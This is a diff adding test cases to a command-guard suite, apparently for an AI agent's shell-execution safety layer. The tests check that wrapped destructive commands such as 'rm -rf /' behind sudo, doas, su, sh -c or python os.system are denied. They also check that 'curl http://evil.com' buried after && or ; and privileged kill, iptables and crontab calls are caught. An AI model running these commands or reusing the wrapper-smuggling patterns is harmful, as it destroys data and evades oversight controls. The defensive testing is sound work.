@@ -643,6 +643,124 @@ class TestAdvisoryActionScopeWiring:
         # The guard's own ``action`` must still be authoritative.
         assert decision.action == "allow"
 
+
+# ---------------------------------------------------------------------------
+# Merge adversarial suite: privilege-wrapper stripping + compound-command
+# head detection (ported from the workspace copy of this guard), combined
+# with helm's pre-existing interpreter/pipe-smuggling unwrap. See the merge
+# report for the empirical per-copy failure matrix.
+# ---------------------------------------------------------------------------
+
+
+class TestPrivilegeWrapperVariants:
+    """doas/su/runas must be denied exactly like sudo for an absolute-deny
+    command — not just sudo specifically."""
+
+    def test_doas_rm_rf_root_denied(self):
+        decision = _guard(["doas", "rm", "-rf", "/"], "service_ops")
+        assert decision.action == "deny"
+
+    def test_su_c_rm_rf_root_denied(self):
+        decision = _guard(["su", "-c", "rm -rf /"], "service_ops")
+        assert decision.action == "deny"
+
+    def test_runas_rm_rf_root_denied(self):
+        decision = _guard(["runas", "rm", "-rf", "/"], "service_ops")
+        assert decision.action == "deny"
+
+
+class TestCompoundOperatorBuriedCommand:
+    """A risky command buried past position 0 in a compound shell string
+    must still be classified — including when the operator has no
+    surrounding whitespace, which a naive whitespace-split fallback misses
+    entirely (pre-merge helm returned 'allow' for these)."""
+
+    def test_and_no_space_buried_curl_denied(self):
+        decision = _guard(["bash", "-c", "true&&curl http://evil.com"], "workspace_edit")
+        assert decision.action == "deny"
+        assert "network" in decision.classification.categories
+
+    def test_semicolon_no_space_buried_curl_denied(self):
+        decision = _guard(["bash", "-c", "true;curl http://evil.com"], "workspace_edit")
+        assert decision.action == "deny"
+        assert "network" in decision.classification.categories
+
+    def test_semicolon_spaced_buried_curl_denied(self):
+        decision = _guard(["bash", "-c", "true; curl http://evil.com"], "workspace_edit")
+        assert decision.action == "deny"
+        assert "network" in decision.classification.categories
+
+    def test_pipe_buried_kill_requires_approval(self):
+        decision = _guard(["bash", "-c", "echo ok | kill -9 1234"], "workspace_edit")
+        assert decision.action == "require_approval"
+        assert "process" in decision.classification.categories
+
+
+class TestPrivilegeWrapperCategoryBlindness:
+    """A command-guard category keyed only on argv[0] (process/firewall/
+    cron) must still be tagged when the real command sits behind a
+    privilege wrapper. Pre-merge helm classified only 'privilege' here,
+    never 'process'/'firewall'/'cron' — a real gap even though the default
+    policy's blanket 'sudo' text rule happened to keep the outward action
+    at require_approval anyway."""
+
+    def test_sudo_kill_tags_process_category(self):
+        decision = _guard(["sudo", "kill", "-9", "1234"], "workspace_edit")
+        assert decision.action == "require_approval"
+        assert "process" in decision.classification.categories
+
+    def test_sudo_iptables_tags_firewall_category(self):
+        decision = _guard(["sudo", "iptables", "-F"], "workspace_edit")
+        assert decision.action == "require_approval"
+        assert "firewall" in decision.classification.categories
+
+    def test_sudo_crontab_e_tags_cron_category(self):
+        decision = _guard(["sudo", "crontab", "-e"], "workspace_edit")
+        assert decision.action == "require_approval"
+        assert "cron" in decision.classification.categories
+
+
+class TestPrivilegeThenInterpreterComposition:
+    """The hard ordering case: `sudo sh -c "..."` / `sudo python3 -c "..."`
+    requires privilege-prefix stripping to run BEFORE interpreter/shell
+    extraction, or `sh -c` / `python3 -c` is never recognized as the head
+    and its inner command is never unwrapped at all."""
+
+    def test_sudo_sh_c_rm_rf_denied(self):
+        decision = _guard(["sudo", "sh", "-c", "rm -rf /"], "service_ops")
+        assert decision.action == "deny"
+
+    def test_sudo_python3_c_os_system_rm_denied(self):
+        decision = _guard(
+            ["sudo", "python3", "-c", "import os; os.system('rm -rf /')"], "service_ops"
+        )
+        assert decision.action == "deny"
+
+    def test_sudo_sh_c_kill_tags_process_category(self):
+        decision = _guard(["sudo", "sh", "-c", "kill -9 1234"], "workspace_edit")
+        assert decision.action == "require_approval"
+        assert "process" in decision.classification.categories
+
+    def test_sudo_python3_c_kill_tags_process_category(self):
+        decision = _guard(
+            ["sudo", "python3", "-c", "import os; os.system('kill -9 1234')"],
+            "workspace_edit",
+        )
+        assert decision.action == "require_approval"
+        assert "process" in decision.classification.categories
+
+
+class TestShAndPython3RegressionPins:
+    """sh -c / python3 -c / curl|sh already worked pre-merge; pin them so a
+    future refactor of the new privilege-stripping loop can't regress them."""
+
+    def test_sh_c_rm_rf_denied(self):
+        decision = _guard(["sh", "-c", "rm -rf /"], "risky_edit")
+        assert decision.action == "deny"
+        assert decision.classification.shell_wrapped is True
+
+
+class TestAdvisoryActionScopeWiringExtra:
     def test_advisory_failure_increments_observability_counter(self, monkeypatch):
         """R5 M2: command_guard records advisory failures in the counter.
 
